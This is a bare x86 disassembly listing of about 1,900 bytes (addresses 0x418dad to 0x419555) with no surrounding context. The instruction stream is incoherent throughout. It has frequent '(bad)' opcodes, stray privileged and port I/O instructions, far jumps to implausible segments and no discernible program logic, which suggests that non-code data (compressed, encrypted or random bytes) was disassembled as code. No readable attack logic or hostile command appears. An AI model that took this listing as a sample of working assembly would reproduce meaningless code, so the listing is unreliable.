  418dad:	adc    dl,ch
  418daf:	xchg   DWORD PTR [ecx],edi
  418db1:	loopne 0x418d8b
  418db3:	shr    BYTE PTR ds:0xc82590cc,cl
  418db9:	adc    eax,0x5132f04
  418dbe:	pop    es
  418dbf:	xchg   ecx,eax
  418dc0:	push   0xa
  418dc2:	int    0x25
  418dc4:	and    al,0xbb
  418dc6:	inc    DWORD PTR [ebx]
  418dc8:	(bad)  
  418dc9:	jg     0x418d6b
  418dcb:	popa   
  418dcc:	std    
  418dcd:	test   esi,ecx
  418dcf:	push   ds
  418dd0:	sub    eax,0xcfe05305
  418dd5:	pop    ebp
  418dd6:	sahf   
  418dd7:	xlat   BYTE PTR ds:[ebx]
  418dd8:	rcpps  xmm4,XMMWORD PTR [eax]
  418ddb:	rol    BYTE PTR [bx+si+0x7afc],0x31
  418de1:	(bad)  
  418de2:	sub    cl,BYTE PTR [eax-0x27d66935]
  418de8:	dec    ebx
  418de9:	sub    dh,BYTE PTR [ebp+0xb]
  418dec:	loopne 0x418e3d
  418dee:	jbe    0x418d98
  418df0:	out    0x4c,eax
  418df2:	or     dh,BYTE PTR [ebx+0x17]
  418df5:	mov    WORD PTR ds:0xbff6e69f,es
  418dfb:	mov    bl,0xe7
  418dfd:	retf   0x3680
  418e00:	ja     0x418e20
  418e02:	mov    ch,0xfb
  418e04:	pop    ebx
  418e05:	xor    eax,0xf673839c
  418e0a:	cmp    DWORD PTR [edx-0x6b7d3008],0xffffffa3
  418e11:	mul    BYTE PTR [edi+ecx*8-0x3c]
  418e15:	clc    
  418e16:	add    al,al
  418e18:	xor    BYTE PTR [ebx+0x29],dh
  418e1b:	fwait
  418e1c:	popf   
  418e1d:	mov    dh,0x8c
  418e1f:	adc    edi,esp
  418e21:	mov    dl,0x76
  418e23:	xchg   BYTE PTR [ebp+0x518f88e],ah
  418e29:	pslld  mm0,QWORD PTR [ecx+0x7415167b]
  418e30:	xor    ecx,ecx
  418e32:	add    edx,DWORD PTR [ebp+0x541d8a0]
  418e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e39:	dec    eax
  418e3a:	stos   DWORD PTR es:[edi],eax
  418e3b:	sub    BYTE PTR [esi+0xb],dl
  418e3e:	xchg   DWORD PTR [ebx+edx*1],edi
  418e41:	arpl   WORD PTR [ebx-0x64],bp
  418e44:	pop    ebp
  418e45:	fisttp QWORD PTR [edi]
  418e47:	stc    
  418e48:	pop    edi
  418e49:	iret   
  418e4a:	(bad)  
  418e4b:	(bad)  
  418e4d:	bound  esp,QWORD PTR [ecx+eiz*4-0x38e854a2]
  418e54:	lds    esp,FWORD PTR [edx-0x1a89e6d5]
  418e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e5b:	adc    dh,cl
  418e5d:	mov    dh,0xf0
  418e5f:	mov    ch,0xac
  418e61:	lods   eax,DWORD PTR ds:[esi]
  418e62:	add    DWORD PTR [esp+ebx*1+0x379d3e75],eax
  418e69:	(bad)  
  418e6a:	int3   
  418e6b:	sbb    edi,esp
  418e6d:	xlat   BYTE PTR ds:[ebx]
  418e6e:	and    cl,dl
  418e70:	test   BYTE PTR [ebx-0x28],dl
  418e73:	push   ds
  418e74:	xchg   esp,eax
  418e75:	(bad)  
  418e76:	or     eax,0x88ed9895
  418e7b:	scas   al,BYTE PTR es:[edi]
  418e7c:	xchg   esi,eax
  418e7d:	arpl   WORD PTR [edx-0x23],ax
  418e80:	push   esi
  418e81:	in     al,dx
  418e82:	pushf  
  418e83:	xchg   edx,eax
  418e84:	mov    ch,0x19
  418e86:	mov    ebx,0x701621b
  418e8b:	dec    ebx
  418e8c:	mov    gs,WORD PTR [esi+0x1]
  418e8f:	push   ecx
  418e90:	and    al,BYTE PTR [esp+eiz*8+0x53fb4c2]
  418e97:	jbe    0x418e24
  418e99:	inc    ecx
  418e9a:	bound  esi,QWORD PTR [edx+ebx*2+0x8]
  418e9e:	(bad)  
  418e9f:	sub    BYTE PTR [edx+0x12a8aaf9],0x3c
  418ea6:	bound  esp,QWORD PTR [ecx]
  418ea8:	inc    esi
  418ea9:	or     eax,DWORD PTR [ebx-0x13]
  418eac:	leave  
  418ead:	add    eax,0xcf55ee80
  418eb2:	imul   ebx,DWORD PTR [ebp+edx*2+0x279ab17e],0xffffffcc
  418eba:	aas    
  418ebb:	push   es
  418ebc:	(bad)  
  418ebd:	scas   al,BYTE PTR es:[edi]
  418ebe:	je     0x418e99
  418ec0:	pop    es
  418ec1:	out    0xc1,eax
  418ec3:	and    ebp,DWORD PTR [ebp+0x6fd7f8ee]
  418ec9:	pop    edi
  418eca:	mov    cl,0xb3
  418ecc:	retf   0x85be
  418ecf:	mov    bl,0x32
  418ed1:	mul    BYTE PTR [ecx]
  418ed3:	div    BYTE PTR [esi]
  418ed5:	js     0x418f3f
  418ed7:	(bad)  
  418ed8:	data16 je 0x418e98
  418edb:	xchg   BYTE PTR [edx-0x2d],al
  418ede:	dec    esi
  418edf:	mov    ecx,0xcf2dfaaf
  418ee4:	cmc    
  418ee5:	xor    eax,0x5566ec22
  418eea:	mov    edx,0xab9299d9
  418eef:	mov    ds:0x8f63f3e5,al
  418ef4:	mov    ah,0x18
  418ef6:	mov    DWORD PTR [edi+0x20],ebx
  418ef9:	out    dx,al
  418efa:	inc    ebp
  418efb:	sbb    ebx,DWORD PTR [ecx+0x43e4ddf1]
  418f01:	repz sub esp,DWORD PTR [esi+0x11d7e694]
  418f08:	inc    ebp
  418f09:	inc    edi
  418f0a:	pop    ebx
  418f0b:	iret   
  418f0c:	dec    esp
  418f0d:	lahf   
  418f0e:	jae    0x418ea2
  418f10:	aad    0xce
  418f12:	cmp    eax,0xb198aeb5
  418f17:	add    DWORD PTR [ecx-0x50],ebp
  418f1a:	push   es
  418f1b:	call   DWORD PTR [eax-0x55a464bd]
  418f21:	jmp    0x5f8c:0x2e654dd5
  418f28:	sub    eax,DWORD PTR [edi+ecx*4]
  418f2b:	dec    edx
  418f2c:	popa   
  418f2d:	clc    
  418f2e:	xchg   ebp,eax
  418f2f:	pop    ecx
  418f30:	inc    edx
  418f31:	shl    al,cl
  418f33:	adc    BYTE PTR [eax-0x18],bh
  418f36:	sbb    DWORD PTR [esi+0x13],ecx
  418f39:	mov    eax,0x203ff0e
  418f3e:	mov    dl,0x97
  418f40:	add    esp,DWORD PTR [ebx]
  418f42:	sbb    eax,0x70a4c707
  418f47:	call   0x9a84:0x43a246a0
  418f4e:	inc    esp
  418f4f:	aas    
  418f50:	mov    ecx,0xd80cf617
  418f55:	retf   0x589e
  418f58:	(bad)  
  418f59:	xchg   edx,eax
  418f5a:	cmc    
  418f5b:	mov    WORD PTR [edi+eiz*2+0x193de8f],?
  418f62:	in     al,0x2f
  418f64:	jl     0x418f43
  418f66:	sub    edi,ebx
  418f68:	pop    edx
  418f69:	iret   
  418f6a:	inc    esp
  418f6b:	cmp    DWORD PTR [eax+0xa1bd825],esi
  418f71:	aam    0x5c
  418f73:	(bad)  [ebx-0x69]
  418f76:	mov    ds:0x33fb943e,eax
  418f7b:	jns    0x418f18
  418f7d:	lock pop es
  418f7f:	cli    
  418f80:	enter  0x5bf8,0xae
  418f84:	cs lock scas eax,DWORD PTR es:[edi]
  418f87:	or     al,0x9
  418f89:	push   cs
  418f8a:	cmc    
  418f8b:	sub    dl,BYTE PTR [eax-0x22ffdc2d]
  418f91:	lock bnd jne 0x418f9f
  418f95:	mov    edx,0x13e84624
  418f9a:	sub    BYTE PTR [edi],dl
  418f9c:	icebp  
  418f9d:	adc    eax,0xb5393754
  418fa2:	xor    BYTE PTR [ebx-0x65db4e65],al
  418fa8:	pop    ss
  418fa9:	xchg   edi,eax
  418faa:	neg    BYTE PTR [ecx]
  418fac:	cwde   
  418fad:	out    dx,al
  418fae:	int    0xb6
  418fb0:	(bad)  
  418fb1:	inc    esi
  418fb2:	xchg   ebp,eax
  418fb3:	jne    0x418f9c
  418fb5:	mov    bl,0x95
  418fb7:	push   ds
  418fb8:	dec    ecx
  418fb9:	mov    ch,0xca
  418fbb:	jns    0x418fc0
  418fbd:	jno    0x419004
  418fbf:	and    al,0xce
  418fc1:	sbb    al,0xdc
  418fc3:	add    bl,BYTE PTR [ebx]
  418fc5:	jae    0x41902d
  418fc7:	pop    ebp
  418fc8:	xor    eax,0x7a7f8a55
  418fcd:	xchg   esi,eax
  418fce:	pop    eax
  418fcf:	lods   al,BYTE PTR ds:[esi]
  418fd0:	push   ecx
  418fd1:	in     eax,0x47
  418fd3:	mov    bl,0xfe
  418fd5:	cmp    DWORD PTR [edi],esi
  418fd7:	sbb    bh,BYTE PTR [edi-0x32]
  418fda:	xchg   edx,eax
  418fdb:	jo     0x419046
  418fdd:	popf   
  418fde:	push   edi
  418fdf:	mov    ah,0xbf
  418fe1:	or     esi,DWORD PTR [edx+0x5]
  418fe4:	and    ecx,DWORD PTR [ebp-0x13]
  418fe7:	xor    al,0xfb
  418fe9:	jle    0x419038
  418feb:	into   
  418fec:	mov    WORD PTR [esi-0x66],cs
  418fef:	sahf   
  418ff0:	xchg   ebx,eax
  418ff1:	ds adc dh,bh
  418ff4:	stc    
  418ff5:	sub    BYTE PTR [eax+ebx*4],0x4b
  418ff9:	mov    bh,0x68
  418ffb:	test   BYTE PTR [ecx-0x16],dl
  418ffe:	retf   0x27dd
  419001:	mov    ds:0x12735af4,eax
  419006:	jnp    0x418fe6
  419008:	popf   
  419009:	shl    DWORD PTR [ebx+0x45],1
  41900c:	and    edx,DWORD PTR [ecx-0xe]
  41900f:	rol    DWORD PTR [eax+0x66],0xbd
  419013:	ss push esi
  419015:	push   0xffffff88
  419017:	push   ecx
  419018:	and    eax,0x8953b76a
  41901d:	mov    dl,0xf6
  41901f:	pop    ds
  419020:	icebp  
  419021:	add    esi,DWORD PTR [esi]
  419023:	mov    dh,0x81
  419025:	add    eax,DWORD PTR [edi-0x56922ad4]
  41902b:	inc    eax
  41902c:	loopne 0x4190a3
  41902e:	pop    ebx
  41902f:	mov    bl,0x7d
  419031:	jg     0x418fe5
  419033:	dec    edi
  419034:	(bad)  
  419036:	or     al,0x87
  419038:	jl     0x418fcf
  41903a:	and    eax,0x552a154f
  41903f:	pop    edx
  419040:	in     eax,dx
  419041:	jnp    0x419078
  419043:	adc    bh,BYTE PTR [eax]
  419045:	mov    ah,0x98
  419047:	mov    bl,0x1
  419049:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41904b:	ss cwde 
  41904d:	(bad)
  419050:	icebp  
  419051:	sbb    eax,0x83f884ba
  419056:	(bad)  
  419057:	fild   WORD PTR [edx]
  419059:	and    BYTE PTR [esi],bh
  41905b:	iret   
  41905c:	lds    edx,FWORD PTR [edi]
  41905e:	and    esi,DWORD PTR [edi+0x70]
  419061:	stos   BYTE PTR es:[edi],al
  419062:	scas   eax,DWORD PTR es:[edi]
  419063:	aaa    
  419064:	fcmovu st,st(7)
  419066:	mov    esp,0x51f69bcb
  41906b:	sub    BYTE PTR [edi],0x5e
  41906e:	adc    al,BYTE PTR [edi+0x7062e2f1]
  419074:	push   cs
  419075:	and    al,0x67
  419077:	adc    ah,bh
  419079:	aad    0x61
  41907b:	pop    ss
  41907c:	push   0xfb5932e
  419081:	push   DWORD PTR [ebp-0x6f]
  419084:	pusha  
  419085:	imul   ecx,DWORD PTR [ecx+0x7d9a4087],0x57
  41908c:	sahf   
  41908d:	(bad)  
  41908e:	in     eax,dx
  41908f:	cdq    
  419090:	int    0xa4
  419092:	push   0x2f
  419094:	pop    es
  419095:	sbb    esi,esi
  419097:	ret    
  419098:	stos   DWORD PTR es:[edi],eax
  419099:	mov    al,ds:0x363033e7
  41909e:	jmp    0x41905c
  4190a0:	pop    eax
  4190a1:	mov    al,0xf0
  4190a3:	ds xchg ebp,eax
  4190a5:	mov    al,0xbe
  4190a7:	loopne 0x41907c
  4190a9:	xor    DWORD PTR [edx],edx
  4190ab:	gs mov dh,0xef
  4190ae:	lods   eax,DWORD PTR ds:[esi]
  4190af:	aam    0x6b
  4190b1:	adc    bl,BYTE PTR [esi+0x5220bd55]
  4190b7:	mov    al,0xa5
  4190ba:	dec    esi
  4190bb:	inc    esp
  4190bc:	and    al,0x45
  4190be:	sti    
  4190bf:	out    0x72,eax
  4190c1:	pop    esp
  4190c2:	mov    dl,0xa8
  4190c4:	daa    
  4190c5:	push   cs
  4190c6:	jmp    0x4190ef
  4190c8:	(bad)  
  4190c9:	rcl    BYTE PTR [esi],1
  4190cb:	(bad)  
  4190cc:	nop
  4190cd:	scas   al,BYTE PTR es:[edi]
  4190ce:	add    al,0x7b
  4190d0:	clc    
  4190d1:	jmp    0x15569222
  4190d6:	adc    al,0x58
  4190d8:	iret   
  4190d9:	sub    DWORD PTR [ecx+0xf],ebp
  4190dc:	retf   
  4190dd:	jns    0x419145
  4190df:	cs hlt 
  4190e1:	ror    BYTE PTR [eax-0x63],cl
  4190e4:	frstor [eax-0x38]
  4190e7:	or     eax,0xeeb6ef27
  4190ec:	fbld   TBYTE PTR [esi+0x3d1fd362]
  4190f2:	mov    gs,WORD PTR [eax-0x5]
  4190f5:	xchg   edi,eax
  4190f6:	mov    ecx,0x663d1331
  4190fb:	je     0x419104
  4190fd:	dec    edx
  4190fe:	fmul   QWORD PTR [ebp+0x5a]
  419101:	and    al,0x52
  419103:	mov    esi,ecx
  419105:	or     DWORD PTR [ebx-0x45],ecx
  419108:	inc    eax
  419109:	nop
  41910a:	xchg   DWORD PTR [esi-0x14],ebx
  41910d:	adc    DWORD PTR [ecx-0x7f22f45a],ecx
  419113:	rol    edi,0x29
  419116:	ret    
  419117:	sub    dh,dl
  419119:	pop    es
  41911a:	mov    edx,0x41f5a871
  41911f:	and    al,0xb8
  419121:	xchg   DWORD PTR [ecx+0x363d727f],esi
  419127:	pop    esi
  419128:	int3   
  419129:	icebp  
  41912a:	ret    
  41912b:	xchg   DWORD PTR [ecx+edi*1+0x1c],eax
  41912f:	cmc    
  419130:	daa    
  419131:	sahf   
  419132:	cmp    DWORD PTR [ebx],ecx
  419134:	dec    ebx
  419135:	cmp    ch,BYTE PTR [edi]
  419137:	hlt    
  419138:	add    bh,BYTE PTR [ebx]
  41913a:	push   ecx
  41913b:	dec    edx
  41913c:	mov    eax,ds:0x427911c4
  419141:	nop
  419142:	pop    ss
  419143:	dec    esp
  419144:	sub    DWORD PTR [ebp-0x511ffd27],0x67
  41914b:	inc    eax
  41914c:	xor    eax,0xbdfc45b4
  419151:	test   BYTE PTR [ecx],bh
  419153:	pop    edi
  419154:	repnz loope 0x4191b9
  419157:	pusha  
  419158:	and    DWORD PTR [eax],0xfffffff3
  41915b:	inc    edx
  41915c:	lods   al,BYTE PTR ds:[esi]
  41915d:	outs   dx,DWORD PTR ds:[esi]
  41915e:	jo     0x41915b
  419160:	push   ecx
  419161:	sub    al,0xa4
  419163:	jl     0x41917f
  419165:	sbb    ax,0x8dfd
  419169:	add    ch,dh
  41916b:	sub    esp,0x65
  41916e:	addr16 dec esi
  419170:	adc    edx,DWORD PTR [eax+ecx*1-0x7d]
  419174:	into   
  419175:	stos   BYTE PTR es:[edi],al
  419176:	xchg   ecx,eax
  419177:	cwde   
  419178:	add    al,BYTE PTR [ebx]
  41917a:	fs adc esi,edx
  41917d:	int    0x4f
  41917f:	dec    edi
  419180:	cmp    DWORD PTR [eax+eax*2-0x325e34f9],esi
  419187:	push   ds
  419188:	xor    DWORD PTR [esi-0x6d],ebp
  41918b:	(bad)  [edx+eax*2]
  41918e:	or     BYTE PTR [esi+0x1e],0x8e
  419192:	fwait
  419193:	retf   
  419194:	pop    ds
  419195:	cld    
  419196:	je     0x419175
  419198:	inc    ecx
  419199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41919a:	xor    DWORD PTR gs:[edi],ecx
  41919d:	adc    BYTE PTR [edx+0x1c],ah
  4191a0:	test   ebp,ecx
  4191a2:	dec    ebx
  4191a3:	xor    al,0xa0
  4191a5:	lock xor ecx,DWORD PTR ds:0xe058f335
  4191ac:	daa    
  4191ad:	sbb    ecx,DWORD PTR [ecx+edi*1+0x6a]
  4191b1:	or     DWORD PTR [edi-0x7d4cb314],esp
  4191b7:	inc    ecx
  4191b8:	in     al,dx
  4191b9:	(bad)  
  4191ba:	imul   edi
  4191bc:	xor    eax,0x9badfec3
  4191c1:	test   al,0xb0
  4191c3:	adc    edx,esp
  4191c5:	ds outs dx,DWORD PTR ss:[esi]
  4191c8:	mov    al,0xc
  4191ca:	vorpd  xmm0,xmm0,XMMWORD PTR [edi+0x45]
  4191cf:	jb     0x419217
  4191d1:	mul    DWORD PTR ss:[esp+ebp*8]
  4191d5:	pop    esi
  4191d6:	sub    al,0x6d
  4191d8:	or     eax,0xfdcb7e98
  4191dd:	pop    ecx
  4191de:	xchg   BYTE PTR [eax-0x39a973b5],dh
  4191e4:	and    ebx,DWORD PTR [edx]
  4191e6:	jg     0x4191a0
  4191e8:	cwde   
  4191e9:	hlt    
  4191ea:	les    edi,FWORD PTR ds:0x13bf236c
  4191f0:	imul   esp,DWORD PTR [edi-0x3927ea9a],0x74
  4191f7:	push   0x2d900654
  4191fc:	outs   dx,DWORD PTR ds:[esi]
  4191fd:	cmc    
  4191fe:	adc    eax,0x62a8ecd5
  419203:	cli    
  419204:	es push ebx
  419206:	cmp    BYTE PTR [eax],al
  419208:	sar    DWORD PTR [edi-0x4254b315],cl
  41920e:	adc    al,0x31
  419210:	mov    dl,0x8f
  419212:	nop
  419213:	mov    ds,WORD PTR [ecx+0x6a33ca78]
  419219:	ret    0xa63e
  41921c:	popa   
  41921d:	sub    BYTE PTR [edx-0x146a3019],dh
  419223:	jb     0x4191f9
  419225:	aas    
  419226:	jns    0x419242
  419228:	test   eax,edi
  41922a:	das    
  41922b:	or     dh,ah
  41922d:	jl     0x4191e2
  41922f:	mov    bh,0x8e
  419231:	dec    edx
  419232:	les    esi,FWORD PTR [ebx+eax*1-0x56b0c5c7]
  419239:	popa   
  41923a:	ss inc ebp
  41923c:	iret   
  41923d:	mov    edx,0x8079321d
  419242:	and    BYTE PTR [eax+0x38],0x74
  419246:	add    bl,BYTE PTR [esi+0x77d6eda0]
  41924c:	jecxz  0x4191e2
  41924e:	test   al,0xaa
  419250:	sbb    eax,DWORD PTR [eax+eax*4+0x1f97aa43]
  419257:	push   edi
  419258:	stc    
  419259:	shl    DWORD PTR [edi+0x74b3633b],1
  41925f:	aas    
  419260:	addr16 xchg edi,eax
  419262:	mov    ch,0x8f
  419264:	les    esi,FWORD PTR [edx]
  419266:	push   edi
  419267:	fld    TBYTE PTR [edx]
  419269:	jecxz  0x4192a0
  41926b:	pop    edx
  41926c:	gs (bad) 
  41926e:	sub    DWORD PTR [esi+esi*4-0x2c],ebp
  419272:	daa    
  419273:	or     eax,0x76fcac69
  419278:	jns    0x4192bf
  41927a:	inc    ecx
  41927b:	(bad)  
  41927c:	jecxz  0x41920e
  41927e:	aas    
  41927f:	stos   DWORD PTR es:[edi],eax
  419280:	adc    esi,DWORD PTR [edx-0x75ea2c4a]
  419286:	inc    edi
  419287:	stos   DWORD PTR es:[edi],eax
  419288:	add    BYTE PTR [edx],ch
  41928a:	push   0xffffffb7
  41928c:	xor    cl,dh
  41928e:	bnd jb 0x4192f5
  419291:	loop   0x4192cc
  419293:	mov    eax,0x1d65839a
  419298:	mov    esp,0xe9ea7a77
  41929d:	jg     0x41926f
  41929f:	scas   al,BYTE PTR es:[edi]
  4192a0:	jg     0x4192a3
  4192a2:	mov    ah,BYTE PTR [ebp-0x66]
  4192a5:	je     0x419316
  4192a7:	test   BYTE PTR [esi+0x4027bc49],cl
  4192ad:	pop    esi
  4192ae:	mov    dl,0x87
  4192b0:	jl     0x4192be
  4192b2:	sbb    ebx,0x9f286dc1
  4192b8:	icebp  
  4192b9:	dec    esp
  4192ba:	sbb    al,0x1e
  4192bc:	test   BYTE PTR [ecx],bh
  4192be:	lods   eax,DWORD PTR ds:[esi]
  4192bf:	ss popa 
  4192c1:	bound  eax,QWORD PTR [bp+0x421d]
  4192c6:	loope  0x41926b
  4192c8:	sahf   
  4192c9:	fdiv   st(7),st
  4192cb:	pop    ecx
  4192cc:	ins    BYTE PTR es:[edi],dx
  4192cd:	and    eax,0x9fd74c88
  4192d2:	hlt    
  4192d3:	fldenv [edi+ecx*1-0x4f91af30]
  4192da:	and    BYTE PTR [eax+0xb242287],bl
  4192e0:	repnz pop edx
  4192e2:	shr    BYTE PTR [eax],1
  4192e4:	mov    ch,0xe6
  4192e6:	dec    esp
  4192e7:	add    BYTE PTR [ecx+0xa],ch
  4192ea:	int3   
  4192eb:	mov    edi,0xd19c816e
  4192f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f1:	pop    ds
  4192f2:	add    bh,BYTE PTR [edi-0x3027dfc3]
  4192f8:	cmp    ch,BYTE PTR ds:0x42328eed
  4192fe:	xchg   ecx,eax
  4192ff:	imul   edi,DWORD PTR [edx],0x93543197
  419305:	cmp    BYTE PTR [esi-0x43],dl
  419308:	inc    edi
  419309:	push   ebx
  41930a:	imul   ebp,esi,0x688ebce0
  419310:	cmp    eax,0x8580e95a
  419315:	push   edx
  419316:	inc    ecx
  419317:	adc    dh,BYTE PTR ds:0xab152737
  41931d:	aaa    
  41931e:	cmp    eax,0xa7610733
  419323:	or     esp,DWORD PTR [ebx]
  419325:	imul   ebp,DWORD PTR [esi+eiz*4+0x53cc24c0],0x59
  41932d:	paddusw mm7,QWORD PTR [esi]
  419330:	jno    0x4192f4
  419332:	lahf   
  419333:	push   ecx
  419334:	clc    
  419335:	aam    0xd0
  419337:	cmp    DWORD PTR [ebx-0x70],ebp
  41933a:	pop    esp
  41933b:	mov    WORD PTR [edx+0x7b],es
  41933e:	adc    cl,BYTE PTR [edi+0x76]
  419341:	pusha  
  419342:	inc    ecx
  419343:	or     ebp,edi
  419345:	lods   ax,WORD PTR ds:[esi]
  419347:	mov    WORD PTR ds:0x6b9834a6,cs
  41934d:	cmp    BYTE PTR [ebp-0x38],bl
  419350:	mov    bl,0x69
  419352:	mov    ebp,DWORD PTR [edx+ebx*2-0x65]
  419356:	std    
  419357:	jg     0x41933f
  419359:	std    
  41935a:	and    cl,BYTE PTR ds:0x3d4470e7
  419360:	jge    0x4193cd
  419362:	sar    BYTE PTR [edi+0x67],1
  419365:	mov    ecx,0x9d3b3ed9
  41936a:	adc    DWORD PTR [edx-0x1da2f110],esp
  419370:	mov    ds:0x78d953f9,al
  419375:	stos   BYTE PTR es:[edi],al
  419376:	rcr    DWORD PTR [esi+ebx*8],1
  419379:	mul    esp
  41937b:	into   
  41937c:	jnp    0x4193ac
  41937e:	jae    0x41936c
  419380:	pop    esi
  419381:	push   esi
  419382:	mov    esi,0x62f892dd
  419387:	rcr    BYTE PTR [ebx+ebx*2+0x303ab4a8],cl
  41938e:	pop    edx
  41938f:	and    BYTE PTR [eax-0x48],bh
  419392:	mov    edx,0x4aedaa2f
  419397:	mov    bl,0x56
  419399:	jl     0x41939d
  41939b:	or     BYTE PTR [eax+0x5e],0x55
  41939f:	and    ebp,DWORD PTR [edi+0x45]
  4193a2:	test   BYTE PTR [esi+ebp*1-0x52],0x19
  4193a7:	sub    ch,BYTE PTR [ecx+0x214a6e60]
  4193ad:	adc    al,0x6c
  4193af:	push   edx
  4193b0:	(bad)  
  4193b1:	mov    edi,0xe73a2336
  4193b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193b7:	stos   DWORD PTR es:[edi],eax
  4193b8:	out    dx,al
  4193b9:	imul   DWORD PTR [esi]
  4193bb:	xor    edi,DWORD PTR [ebx+0x271aa549]
  4193c1:	pop    ds
  4193c2:	bound  esp,QWORD PTR [edx]
  4193c4:	sbb    BYTE PTR [edi-0x4bde95a1],ah
  4193ca:	cmc    
  4193cb:	cmp    ecx,DWORD PTR [edi]
  4193cd:	pop    edi
  4193ce:	scas   eax,DWORD PTR es:[edi]
  4193cf:	xchg   esp,eax
  4193d0:	and    DWORD PTR [edx+0x17],edi
  4193d3:	push   ds
  4193d4:	pop    ebx
  4193d5:	(bad)  
  4193d6:	cmp    BYTE PTR [ebx+0x11702030],ch
  4193dc:	shr    ebp,1
  4193de:	rcr    DWORD PTR [ecx-0x1e4f4096],1
  4193e4:	repz sub BYTE PTR [ebx+0x32],ah
  4193e8:	adc    ebx,edx
  4193ea:	xchg   edx,eax
  4193eb:	aas    
  4193ec:	push   ecx
  4193ed:	mov    esp,0xa336df15
  4193f2:	ror    BYTE PTR [edi],0x3
  4193f5:	fidivr WORD PTR [esi+esi*1-0x65]
  4193f9:	and    al,0xcb
  4193fb:	retf   0xcd23
  4193fe:	out    0xc2,eax
  419400:	rcr    dl,1
  419402:	xor    edx,ebx
  419404:	pushf  
  419405:	sbb    DWORD PTR [ebx-0x6c],ebp
  419408:	mov    ebx,0x5562f806
  41940d:	(bad)  
  41940e:	sbb    esi,DWORD PTR [ecx-0x53da1ebd]
  419414:	stos   BYTE PTR es:[edi],al
  419415:	imul   edi,DWORD PTR [ebx-0x4d],0xffffff81
  419419:	mov    ah,0x28
  41941b:	sbb    eax,0x1ff45cee
  419420:	sbb    eax,0xbbad263d
  419425:	bound  ebx,QWORD PTR [edx+0x6da2fe45]
  41942b:	lea    ecx,[eax]
  41942d:	out    dx,eax
  41942e:	xlat   BYTE PTR ds:[ebx]
  41942f:	ret    0xc0b2
  419432:	enter  0x192d,0x7a
  419436:	xchg   ebx,eax
  419438:	stos   BYTE PTR es:[edi],al
  419439:	imul   ecx,DWORD PTR ds:0xfcf889d9,0xffffffcb
  419440:	imul   ecx,DWORD PTR [edi-0x20],0xffffffc9
  419444:	sbb    eax,0xd71bf049
  419449:	xlat   BYTE PTR ds:[ebx]
  41944a:	aam    0x7f
  41944c:	shl    DWORD PTR [ecx-0x7],1
  41944f:	adc    eax,0x260268df
  419454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419455:	mov    edi,0xb513edb9
  41945a:	out    0xbd,eax
  41945c:	dec    esp
  41945d:	push   esp
  41945e:	cmc    
  41945f:	aad    0xde
  419461:	fcom   DWORD PTR [ebx-0x6fa8321a]
  419467:	enter  0xee66,0x72
  41946b:	push   bx
  41946d:	cmp    al,al
  41946f:	test   DWORD PTR [ebp-0x79],edi
  419472:	mov    ecx,esi
  419474:	ds stc 
  419476:	adc    eax,0xc35f96ac
  41947b:	dec    esi
  41947c:	jne    0x419493
  41947e:	pop    ebp
  41947f:	adc    bl,BYTE PTR [edi-0x77]
  419482:	xor    eax,0xf4d18b73
  419487:	loope  0x419467
  419489:	add    DWORD PTR [ebx],0x13
  41948c:	mov    WORD PTR [edi+0x28],es
  41948f:	mov    al,ds:0x58314593
  419494:	push   ecx
  419495:	fadd   DWORD PTR [ecx+0x50]
  419498:	cmp    al,0x55
  41949a:	popf   
  41949b:	jnp    0x4194a1
  41949d:	adc    BYTE PTR [esi+0x25],ah
  4194a0:	cs enter 0x2cc7,0xc
  4194a5:	call   0x9bf0:0x50d34b83
  4194ac:	fldenv [edx-0x28a484f0]
  4194b2:	mov    edi,0x8b294d05
  4194b7:	icebp  
  4194b8:	and    DWORD PTR [edi-0x37],esi
  4194bb:	jecxz  0x41952b
  4194bd:	push   edi
  4194be:	xor    al,0xd8
  4194c0:	mov    ds:0xe7eca36e,eax
  4194c5:	sub    esi,DWORD PTR [edi+0x4a]
  4194c8:	scas   al,BYTE PTR es:[edi]
  4194c9:	adc    al,0x49
  4194cb:	data16 sub al,0x7
  4194ce:	sbb    bh,ah
  4194d0:	int3   
  4194d1:	mov    DWORD PTR [esi+0x75d6e9e1],edi
  4194d7:	add    BYTE PTR [eax-0x1812aeb],ah
  4194dd:	pop    edx
  4194de:	and    ch,ah
  4194e0:	(bad)  
  4194e1:	bound  edx,QWORD PTR [esi]
  4194e3:	loopne 0x4194a9
  4194e5:	je     0x419566
  4194e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e8:	inc    eax
  4194e9:	cwde   
  4194ea:	sub    ecx,DWORD PTR ds:0x550b808d
  4194f0:	pop    ebp
  4194f1:	jmp    0x419509
  4194f3:	mov    ds,WORD PTR [ebp+0x4b]
  4194f6:	sbb    eax,DWORD PTR [edi-0x22809d3c]
  4194fc:	and    dh,bh
  4194fe:	sub    cl,BYTE PTR [ecx]
  419500:	mov    ah,0x88
  419502:	(bad)  
  419504:	lea    edi,[eax+ebx*4+0x72ef7a21]
  41950b:	(bad)  
  41950c:	pusha  
  41950d:	xor    esi,DWORD PTR [eax+0x22]
  419510:	cmc    
  419511:	xor    ecx,ebx
  419513:	xchg   edi,eax
  419514:	into   
  419515:	sbb    DWORD PTR [ebx+0x58],ecx
  419518:	stos   BYTE PTR es:[edi],al
  419519:	imul   ebx,eax,0xef51ef39
  41951f:	pop    es
  419520:	retf   0x852b
  419523:	pop    edi
  419524:	stc    
  419525:	mov    cl,0xfc
  419527:	pop    edx
  419528:	jp     0x4194bd
  41952a:	pop    edx
  41952b:	lods   eax,DWORD PTR ds:[esi]
  41952c:	mov    ebx,0xb2274fd5
  419531:	jle    0x41955a
  419533:	mov    al,0x99
  419535:	lock add DWORD PTR [edi-0x12c40ec8],ecx
  41953c:	sub    al,0xc3
  41953e:	lods   al,BYTE PTR ds:[esi]
  41953f:	fisttp DWORD PTR [edx+ebp*2+0x4b]
  419543:	outs   dx,DWORD PTR ds:[esi]
  419544:	das    
  419545:	mov    bh,0x6d
  419547:	int    0xd5
  419549:	lods   eax,DWORD PTR ds:[esi]
  41954a:	and    eax,0xb16b2d9a
  41954f:	in     al,0xdb
  419551:	push   cs
  419552:	or     BYTE PTR [edi+0x4],al
  419555:	sbb    BYTE PTR [edi-0x7b],cl
